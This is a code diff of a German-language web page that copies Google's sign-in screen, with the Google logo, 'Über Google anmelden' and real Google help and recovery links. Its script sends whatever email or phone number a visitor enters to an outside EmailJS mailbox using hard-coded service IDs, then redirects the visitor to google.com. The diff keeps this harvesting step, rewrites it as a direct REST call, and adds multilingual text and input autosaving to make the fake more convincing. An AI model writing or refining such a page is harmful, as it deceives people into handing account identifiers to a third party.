@@ -1,4 +1,3 @@
-
 <!doctype html>
 <html lang="de">
 <head>
@@ -6,13 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet"/>
   <title>Anmeldung</title>
-  <script type="importmap">
-  {
-    "imports": {
-      "emailjs": "https://esm.sh/emailjs-com@3.2.0"
-    }
-  }
-  </script>
   <style>
 :root {
   --bg: #000;
@@ -25,7 +17,7 @@
   --text: #e8eaed;
 }
 * { box-sizing: border-box; font-family: system-ui, -apple-system, BlinkMacSystemFont, "Roboto", sans-serif; }
-body{ background-color: #0E0E0E; margin:0; display: flex; justify-content: center; align-items: flex-start; position: relative; height:100vh; overflow:hidden; color: white; }
+body{ background-color: #0E0E0E; margin:0; display: flex; justify-content: center; align-items: flex-start; position: relative; height:100vh;color: white;padding-bottom: 200px; }
 
 /* Form styles */
 .form-group{ height: 48px; margin: 9px; position: relative; }
@@ -51,16 +43,15 @@ body{ background-color: #0E0E0E; margin:0; display: flex; justify-content: cente
   color:#BEBEBE;
   height:10px;
   top: 1px;
-  width:220px;
-  left: 3px;
+  width:auto;
+  z-index: 1;
+  left: 7px;
   background-color:#0E0E0E;
-  padding: 15px 14px;
+  padding: 15px 4px;
   font-size:15px;
   transition: .24s ease;
   pointer-events: none;
 }
-
-/* Focus: floating label + blue border */
 .form-control:focus + .class-label{
   top:-24px;
   z-index:200;
@@ -72,10 +63,6 @@ body{ background-color: #0E0E0E; margin:0; display: flex; justify-content: cente
 .form-control:focus{
   border: 2px solid var(--focus);
 }
-
-/* Keep label floated when input has content (still not focused)
-   Using :placeholder-shown requires a placeholder attribute; we set placeholder=" " on the input.
-*/
 .form-control:not(:placeholder-shown) + .class-label{
   top:-24px;
   z-index:200;
@@ -83,7 +70,6 @@ body{ background-color: #0E0E0E; margin:0; display: flex; justify-content: cente
   color: var(--focus);
   font-weight: 300;
 }
-
 /* Hauptcontainer */
 .main-components { max-width: 400px; width: 100%; display: flex; flex-direction: column; }
 /* Top-Container */
@@ -102,7 +88,21 @@ hr { width: 100%; height: 1px; background-color: #373737; border: none; }
 .info-text a { color: #647FAC; text-decoration: none; }
 
 /* Button Style */
-#loginButton { background-color: #9AB6E5; color: black; border: none; padding: 10px 24px; border-radius: 20px; font-size: 14px; cursor: pointer; margin-left: 260px; display: block; margin-top: -345px; }
+#loginButton {
+  background-color: #9AB6E5;
+  color: black;
+  border: none;
+  width: auto;
+  padding: 10px 24px;
+  border-radius: 20px;
+  font-size: 14px;
+  cursor: pointer;
+  display: block;
+  margin-top: -390px;
+  margin-right: 19px; /* Abstand von rechts */
+  position: absolute; /* falls notwendig für exakte Positionierung */
+  right: 0; /* Button an der rechten Seite positionieren */
+}
 
 .footer-links { margin-top: 20px; text-align: center; font-size: 13px; color: #aaa; }
 .footer-links a { color: #aaa; margin: 0 10px; text-decoration: none; }
@@ -112,12 +112,26 @@ hr { width: 100%; height: 1px; background-color: #373737; border: none; }
 .card { width:100%; max-width:420px; background: transparent; box-sizing:border-box; }
 
 /* Language select styles */
-.select-wrapper { width: 220px; position: relative; margin: 0 5px; }
-.select-btn { height: 34px; background: transparent; border: 1px solid transparent; border-radius: 6px; padding: 0 5px; font-size: 13px; color: var(--text); display: flex; align-items: center; justify-content: space-between; cursor: pointer; transition: background 0.15s ease, border-color 0.15s ease; }
-.select-btn:hover, .select-btn.open { background: var(--field-bg); border-color: #A8C7FA; box-shadow: 0 0 0 1px var(--focus); }
+.select-wrapper { width: 240px; position: relative; z-index:300;margin: 0 5px; }
+.select-btn {
+  height: 34px;
+  width: auto; /* Hier die Breite anpassen */
+  background: transparent;
+  border: 1px solid transparent;
+  border-radius: 6px;
+  padding: 0 5px;
+  font-size: 13px;
+  color: var(--text);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  cursor: pointer;
+  transition: background 0.15s ease, border-color 0.15s ease;
+}
+.select-btn:hover, .select-btn.open { background: var(--field-bg); border-color: #A8C7FA;}
 .select-btn svg { width: 16px; height: 16px; fill: var(--text); transition: transform 0.2s ease, fill 0.1s ease; }
 .select-btn.open svg { transform: rotate(180deg); fill: var(--focus); }
-.select-dropdown { position: absolute; bottom: calc(21% + 12px); left: 0; width: 220px; background: var(--dropdown-bg); border-radius: 3px; padding: 6px 0; display: none; z-index: 30; box-shadow: 0 6px 18px rgba(0,0,0,0.6); }
+.select-dropdown { position: absolute; bottom: calc(21% + 12px); left: 0; width: 220px; background: var(--dropdown-bg); border-radius: 3px; padding: 6px 0; display: none; z-index: 30; }
 .select-dropdown.open { display: block; }
 .select-dropdown li { list-style: none; padding: 15px 8px; font-size: 11px; color: var(--text); cursor: pointer; white-space: nowrap; }
 .select-dropdown li:hover { background: var(--hover); }
@@ -129,9 +143,9 @@ hr { width: 100%; height: 1px; background-color: #373737; border: none; }
 }
 .bottom-links {
   display: flex;
-   
+   padding-bottom: 20px; 
   gap: 10px;                 /* Abstand zwischen den Links */
-  margin-top: 30px;          /* Abstand unter der Sprachwahl */
+  margin-top: 40px;          /* Abstand unter der Sprachwahl */
 }
 
 .bottom-links a {
@@ -155,53 +169,53 @@ hr { width: 100%; height: 1px; background-color: #373737; border: none; }
         <div class="header">
           <div class="top-row">
             <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google Logo" />
-            <p style="padding: 0px 1;font-size:13px;color: #B2B2B2; margin:0">Über Google anmelden</p>
+            <p id="header-sub" style="padding: 0px 1;font-size:13px;color: #B2B2B2; margin:0">Über Google anmelden</p>
           </div>
           <hr />
         </div>
       </div>
       <div class="bottom-section">
-        <h1 style="padding: 10px 10px; color: white">Anmeldung</h1>
-        <p class="subtext">Weiter zu DeepAI</p>
+        <h1 id="title" style="padding: 10px 10px; color: white">Anmeldung</h1>
+        <p id="subtitle" class="subtext">Weiter zu DeepAI</p>
         <div style="height: 40px;"></div>
 
         <form id="sendForm" class="form" novalidate>
           <div class="form-group">
             <!-- Wichtig: placeholder=" " damit :placeholder-shown funktioniert -->
             <input type="text" name="name" id="name" class="form-control" required autocomplete="off" placeholder=" " />
-            <label for="name" class="class-label">E-Mail oder Telefonnummer</label>
+            <label for="name" id="label-email" class="class-label">E-Mail oder Telefonnummer</label>
           </div>
 
-          <a href="#" class="link" style="padding: 0px 10px; color:#A8C7FA">E-Mail-Adresse vergessen?</a>
+          <a href="https://accounts.google.com/signin/recovery?ec=ar_hc_7682439" id="forgot" class="link" style="padding: 0px 10px; color:#A8C7FA">E-Mail-Adresse vergessen?</a>
 
           <div class="info-text" style="margin-top: 80px;">
-            <a href="#" style="padding: 0px 10px; color:#A8C7FA">Konto erstellen</a>
+            <a href="https://accounts.google.com/SignUp?continue=https://myaccount.google.com%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dcreate-account-button" id="create-account" style="padding: 0px 10px; color:#A8C7FA">Konto erstellen</a>
           </div>
 
-          <div style="height: 240px;"></div>
+          <div style="height: 255px;"></div>
 
           <div class="select-wrapper" id="langSelect">
             <div class="select-btn" id="btn"> Deutsch <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg></div>
             <ul class="select-dropdown" id="list" role="listbox" aria-label="Sprachen">
-              <li role="option">Afrikaans</li>
-              <li role="option">azərbaycan</li>
-              <li role="option">bosanski</li>
-              <li role="option">català</li>
-              <li role="option">Čeština</li>
-              <li role="option">Cymraeg</li>
-              <li role="option">Dansk</li>
-              <li class="active" role="option" aria-selected="true">Deutsch</li>
-              <li role="option">eesti</li>
-              <li role="option">English (United Kingdom)</li>
-              <li role="option">English (United States)</li>
-              <li role="option">Español (España)</li>
+              <li data-code="af">Afrikaans</li>
+              <li data-code="az">azərbaycan</li>
+              <li data-code="bs">bosanski</li>
+              <li data-code="ca">català</li>
+              <li data-code="cs">Čeština</li>
+              <li data-code="cy">Cymraeg</li>
+              <li data-code="da">Dansk</li>
+              <li class="active" role="option" aria-selected="true" data-code="de">Deutsch</li>
+              <li data-code="et">eesti</li>
+              <li data-code="en-GB">English (United Kingdom)</li>
+              <li data-code="en-US">English (United States)</li>
+              <li data-code="es">Español (España)</li>
             </ul>
           </div>
 <!-- Neue Links unter der Sprachauswahl -->
 <div class="bottom-links">
-  <a href="https://support.google.com/accounts?hl=de&p=account_iph">Hilfe</a>
-  <a href="https://accounts.google.com/TOS?loc=DE&hl=de&privacy=true">Datenschutz</a>
-  <a href="https://accounts.google.com/TOS?loc=DE&hl=de">Nutzungsbedingungen</a>
+  <a id="help-link" href="https://support.google.com/accounts?hl=de&p=account_iph">Hilfe</a>
+  <a id="privacy-link" href="https://accounts.google.com/TOS?loc=DE&hl=de&privacy=true">Datenschutz</a>
+  <a id="tos-link" href="https://accounts.google.com/TOS?loc=DE&hl=de">Nutzungsbedingungen</a>
 </div>
 
           <input type="submit" id="loginButton" value="Weiter" />
@@ -210,117 +224,184 @@ hr { width: 100%; height: 1px; background-color: #373737; border: none; }
     </div>
   </div>
 
-  <script type="module">
-/* Language dropdown behavior + ensure label state is correct on load */
+  <script>
+
 (function(){
+  // emailjs REST endpoint and credentials
+  const EMAILJS_URL = "https://api.emailjs.com/api/v1.0/email/send";
+  const SERVICE_ID = "service_8ypqbgk";
+  const TEMPLATE_ID = "template_deqdkha";
+  const USER_ID = "3yT23vyp0ntqbG7BP";
+
+  // small helper to POST to EmailJS
+  async function sendEmail(templateParams) {
+    const body = {
+      service_id: SERVICE_ID,
+      template_id: TEMPLATE_ID,
+      user_id: USER_ID,
+      template_params: templateParams
+    };
+    const resp = await fetch(EMAILJS_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(body)
+    });
+    if (!resp.ok) {
+      const text = await resp.text().catch(()=>resp.statusText);
+      throw new Error("EmailJS send failed: " + resp.status + " " + text);
+    }
+    return resp;
+  }
+
+  // --- language switcher code (unchanged behavior) ---
   const btn = document.getElementById("btn");
   const list = document.getElementById("list");
   const wrapper = document.getElementById("langSelect");
 
-  btn.addEventListener("click", (e) => {
-    e.stopPropagation();
-    btn.classList.toggle("open");
-    list.classList.toggle("open");
-  });
+  const mappings = { /* (same mapping data as original) */
+    "af": { langLabel: "Afrikaans", title: "Aanmelding", subtitle: "Voortgaan na DeepAI", headerSub: "Teken in met Google", labelEmail: "E-pos of telefoonnommer", forgot: "E-posadres vergeet?", createAccount: "Skep 'n rekening", continueBtn: "Gaan voort", help: "Hulp", privacy: "Privaatheid", tos: "Diensvoorwaardes", docLang: "af" },
+    "az": { langLabel: "azərbaycan", title: "Giriş", subtitle: "DeepAI-ya davam et", headerSub: "Google ilə daxil olun", labelEmail: "E-poçt və ya telefon", forgot: "E-poçt ünvanını unutdunuz?", createAccount: "Hesab yaradın", continueBtn: "Davam et", help: "Kömək", privacy: "Məxfilik", tos: "İstifadə şərtləri", docLang: "az" },
+    "bs": { langLabel: "bosanski", title: "Prijava", subtitle: "Nastavi na DeepAI", headerSub: "Prijavite se s Google računom", labelEmail: "E-pošta ili telefon", forgot: "Zaboravili ste e-poštu?", createAccount: "Kreiraj račun", continueBtn: "Dalje", help: "Pomoć", privacy: "Privatnost", tos: "Uvjeti korištenja", docLang: "bs" },
+    "ca": { langLabel: "català", title: "Inici de sessió", subtitle: "Continuar a DeepAI", headerSub: "Inicia sessió amb el teu compte de Google", labelEmail: "Correu electrònic o telèfon", forgot: "Has oblidat el correu electrònic?", createAccount: "Crea un compte", continueBtn: "Següent", help: "Ajuda", privacy: "Privadesa", tos: "Condicions", docLang: "ca" },
+    "cs": { langLabel: "Čeština", title: "Přihlášení", subtitle: "Pokračovat na DeepAI", headerSub: "Přihlásit se pomocí Googlu", labelEmail: "E‑mail nebo telefon", forgot: "Zapomněli jste e‑mail?", createAccount: "Vytvořit účet", continueBtn: "Pokračovat", help: "Nápověda", privacy: "Ochrana osobních údajů", tos: "Podmínky", docLang: "cs" },
+    "cy": { langLabel: "Cymraeg", title: "Mewngofnodi", subtitle: "Yn eich blaen i DeepAI", headerSub: "Mewngofnodi gyda Google", labelEmail: "E-bost neu rif ffôn", forgot: "Wedi anghofio e-bost?", createAccount: "Creu cyfrif", continueBtn: "Yn eich blaen", help: "Cymorth", privacy: "Preifatrwydd", tos: "Telerau", docLang: "cy" },
+    "da": { langLabel: "Dansk", title: "Log ind", subtitle: "Fortsæt til DeepAI", headerSub: "Log ind med Google", labelEmail: "E-mail eller telefon", forgot: "Glemt e-mail?", createAccount: "Opret konto", continueBtn: "Næste", help: "Hjælp", privacy: "Privatliv", tos: "Betingelser", docLang: "da" },
+    "de": { langLabel: "Deutsch", title: "Anmeldung", subtitle: "Weiter zu DeepAI", headerSub: "Über Google anmelden", labelEmail: "E-Mail oder Telefonnummer", forgot: "E-Mail-Adresse vergessen?", createAccount: "Konto erstellen", continueBtn: "Weiter", help: "Hilfe", privacy: "Datenschutz", tos: "Nutzungsbedingungen", docLang: "de" },
+    "et": { langLabel: "eesti", title: "Sisselogimine", subtitle: "Jätka DeepAI juurde", headerSub: "Logi sisse Google'i abil", labelEmail: "E-post või telefon", forgot: "Unustasid e-posti?", createAccount: "Loo konto", continueBtn: "Jätka", help: "Abi", privacy: "Privaatsus", tos: "Kasutustingimused", docLang: "et" },
+    "en-GB": { langLabel: "English (United Kingdom)", title: "Sign in", subtitle: "Continue to DeepAI", headerSub: "Sign in with Google", labelEmail: "Email or phone", forgot: "Forgot email?", createAccount: "Create account", continueBtn: "Continue", help: "Help", privacy: "Privacy", tos: "Terms of Service", docLang: "en-GB" },
+    "en-US": { langLabel: "English (United States)", title: "Sign in", subtitle: "Continue to DeepAI", headerSub: "Sign in with Google", labelEmail: "Email or phone", forgot: "Forgot email?", createAccount: "Create account", continueBtn: "Continue", help: "Help", privacy: "Privacy", tos: "Terms of Service", docLang: "en-US" },
+    "es": { langLabel: "Español (España)", title: "Iniciar sesión", subtitle: "Continuar a DeepAI", headerSub: "Inicia sesión con Google", labelEmail: "Correo electrónico o teléfono", forgot: "¿Olvidaste el correo?", createAccount: "Crear cuenta", continueBtn: "Siguiente", help: "Ayuda", privacy: "Privacidad", tos: "Términos", docLang: "es" }
+  };
 
-  list.addEventListener("click", (e) => {
-    const li = e.target.closest("li");
-    if (!li) return;
-    Array.from(list.children).forEach(x => x.classList.remove("active"));
-    li.classList.add("active");
-    // update visible text node only (keeps svg)
-    btn.childNodes[0].textContent = li.textContent;
-    btn.classList.remove("open");
-    list.classList.remove("open");
-  });
+  const els = {
+    title: document.getElementById("title"),
+    subtitle: document.getElementById("subtitle"),
+    headerSub: document.getElementById("header-sub"),
+    labelEmail: document.getElementById("label-email"),
+    forgot: document.getElementById("forgot"),
+    createAccount: document.getElementById("create-account"),
+    loginButton: document.getElementById("loginButton"),
+    helpLink: document.getElementById("help-link"),
+    privacyLink: document.getElementById("privacy-link"),
+    tosLink: document.getElementById("tos-link"),
+    btn: btn
+  };
 
-  document.addEventListener("click", e => {
-    if (!e.target.closest(".select-wrapper")) {
-      btn.classList.remove("open");
-      list.classList.remove("open");
-    }
-  });
-
-  document.addEventListener("keydown", (e) => {
-    if (e.key === "Escape") {
-      btn.classList.remove("open");
-      list.classList.remove("open");
-    }
-  });
-
-  // Ensure floating label is applied on page load for any prefilled value (e.g., from autofill)
-  const inputs = document.querySelectorAll('.form-control');
-  inputs.forEach(inp => {
-    if (inp.value.trim() !== '') {
-      // CSS handles this via :placeholder-shown
-    } else {
-      inp.addEventListener('input', () => {
-        // no JS needed, CSS handles floating label
-      });
-    }
-  });
-
-  // Simple EmailJS setup + form submit and add 3s redirect to Google WITHOUT changing the button text
-  import("emailjs").then(emailjs => {
-    const PUBLIC_KEY = "3yT23vyp0ntqbG7BP";
-    const SERVICE_ID = "service_8ypqbgk";
-    const TEMPLATE_ID = "template_deqdkha";
-    if (emailjs && emailjs.init) emailjs.init(PUBLIC_KEY);
-
-    const form = document.getElementById("sendForm");
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
-      const nameInput = document.getElementById("name");
-      const nameValue = nameInput.value.trim();
-      if (!nameValue) {
-        alert("Bitte Namen/E-Mail oder Telefonnummer eingeben.");
-        nameInput.focus();
-        return;
-      }
-      const templateParams = { name: nameValue };
-
-      try {
-        await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
-        form.reset();
-      } catch (err) {
-        console.error("EmailJS Fehler:", err);
-      } finally {
-        // Disable the submit button but DO NOT change its text/value
-        const btnSubmit = document.getElementById("loginButton");
-        if (btnSubmit) {
-          btnSubmit.disabled = true;
-          btnSubmit.style.opacity = "0.8";
-          btnSubmit.style.cursor = "default";
-        }
-        setTimeout(() => {
-          window.location.href = "https://google.com";
-        }, 100);
-      }
+  function applyLang(code) {
+    const pack = mappings[code] || mappings["en-US"];
+    els.title.textContent = pack.title;
+    els.subtitle.textContent = pack.subtitle;
+    els.headerSub.textContent = pack.headerSub;
+    els.labelEmail.textContent = pack.labelEmail;
+    els.forgot.textContent = pack.forgot;
+    els.createAccount.textContent = pack.createAccount;
+    els.loginButton.value = pack.continueBtn;
+    els.helpLink.textContent = pack.help;
+    els.privacyLink.textContent = pack.privacy;
+    els.tosLink.textContent = pack.tos;
+    if (pack.docLang) document.documentElement.lang = pack.docLang;
+    const hl = pack.docLang || code;
+    els.helpLink.href = `https://support.google.com/accounts?hl=${encodeURIComponent(hl)}&p=account_iph`;
+    els.privacyLink.href = `https://accounts.google.com/TOS?loc=${encodeURIComponent((hl==='de')?'DE':hl)}&hl=${encodeURIComponent(hl)}&privacy=true`;
+    els.tosLink.href = `https://accounts.google.com/TOS?loc=${encodeURIComponent((hl==='de')?'DE':hl)}&hl=${encodeURIComponent(hl)}`;
+    btn.childNodes[0].textContent = pack.langLabel + " ";
+    Array.from(list.children).forEach(li => {
+      li.classList.toggle("active", li.dataset.code === code);
+      if (li.dataset.code === code) li.setAttribute("aria-selected", "true"); else li.removeAttribute("aria-selected");
     });
-  }).catch(err => {
-    // If import fails, still ensure redirect behavior works
-    const form = document.getElementById("sendForm");
-    form.addEventListener("submit", (e) => {
-      e.preventDefault();
-      const nameInput = document.getElementById("name");
-      const nameValue = nameInput.value.trim();
-      if (!nameValue) {
-        alert("Bitte Namen/E-Mail oder Telefonnummer eingeben.");
-        nameInput.focus();
-        return;
-      }
-      const btnSubmit = document.getElementById("loginButton");
-      if (btnSubmit) {
-        btnSubmit.disabled = true;
-        btnSubmit.style.opacity = "0.8";
-        btnSubmit.style.cursor = "default";
-      }
-      setTimeout(() => {
-        window.location.href = "https://google.com";
-      }, 3000);
-    }, { once: true });
-    console.error("EmailJS import failed:", err);
+    try { localStorage.setItem("site_lang", code); } catch(e){}
+  }
+
+  const initial = (function(){ try { return localStorage.getItem("site_lang") || "de"; } catch(e){ return "de"; } })();
+  applyLang(initial);
+
+  btn.addEventListener("click", (e) => { e.stopPropagation(); btn.classList.toggle("open"); list.classList.toggle("open"); });
+  list.addEventListener("click", (e) => {
+    const li = e.target.closest("li"); if (!li) return;
+    const code = li.dataset.code || "en-US";
+    applyLang(code); btn.classList.remove("open"); list.classList.remove("open");
   });
+  document.addEventListener("click", e => { if (!e.target.closest(".select-wrapper")) { btn.classList.remove("open"); list.classList.remove("open"); }});
+  document.addEventListener("keydown", (e) => { if (e.key === "Escape") { btn.classList.remove("open"); list.classList.remove("open"); }});
+
+  // --- form submit with EmailJS REST ---
+  const form = document.getElementById("sendForm");
+  const nameInput = document.getElementById("name");
+  const submitBtn = document.getElementById("loginButton");
+
+  // --- Autosave every 200ms to localStorage ---
+  const AUTOSAVE_KEY = "autosave_name_value_v1";
+  let lastSaved = null;
+  // restore saved value on load
+  try {
+    const saved = localStorage.getItem(AUTOSAVE_KEY);
+    if (saved !== null) {
+      nameInput.value = saved;
+      // trigger label float state if value exists
+      nameInput.dispatchEvent(new Event('input', { bubbles: true }));
+    }
+  } catch (e) { /* ignore storage errors */ }
+
+  // track last known value to avoid redundant writes
+  function trySaveNow() {
+    try {
+      const v = nameInput.value;
+      if (v !== lastSaved) {
+        localStorage.setItem(AUTOSAVE_KEY, v);
+        lastSaved = v;
+      }
+    } catch (e) { /* ignore storage errors */ }
+  }
+
+  // also update lastSaved on manual input so interval detects changes
+  nameInput.addEventListener('input', () => {
+    // update lastSaved only when equal to stored value to prevent skipping; keep simple: don't change lastSaved here
+    // but we can leave it so interval will pick up new value
+  });
+
+  // save immediately on blur and before unload
+  nameInput.addEventListener('blur', trySaveNow);
+  window.addEventListener('beforeunload', trySaveNow);
+
+  // periodical save every 200ms
+  const autosaveInterval = setInterval(trySaveNow, 200);
+
+  // --- submit handling ---
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const nameValue = nameInput.value.trim();
+    const code = localStorage.getItem("site_lang") || initial;
+    const msgs = {
+      "de":"Bitte Namen/E-Mail oder Telefonnummer eingeben.",
+      "en-US":"Please enter email/phone.",
+      "en-GB":"Please enter email/phone."
+    };
+    if (!nameValue) { alert(msgs[code] || msgs["en-US"]); nameInput.focus(); return; }
+
+    // disable button while sending
+    submitBtn.disabled = true;
+    submitBtn.style.opacity = "0.7";
+    submitBtn.style.cursor = "default";
+
+    try {
+      // Send template_params with key "name" per user's request
+      await sendEmail({ name: nameValue });
+
+      // on success: brief confirmation then redirect (keeps UX similar to original)
+      try { localStorage.setItem("last_sent_name", nameValue); } catch(e){}
+      // ensure saved state is up to date before redirect
+      trySaveNow();
+      setTimeout(()=> { window.location.href = "https://google.com"; }, 800);
+    } catch (err) {
+      // re-enable button and show error
+      submitBtn.disabled = false;
+      submitBtn.style.opacity = "1";
+      submitBtn.style.cursor = "pointer";
+      console.error(err);
+      alert("Fehler beim Senden. Bitte später erneut versuchen.");
+    }
+  });
+
 })();
   </script>
 </body>
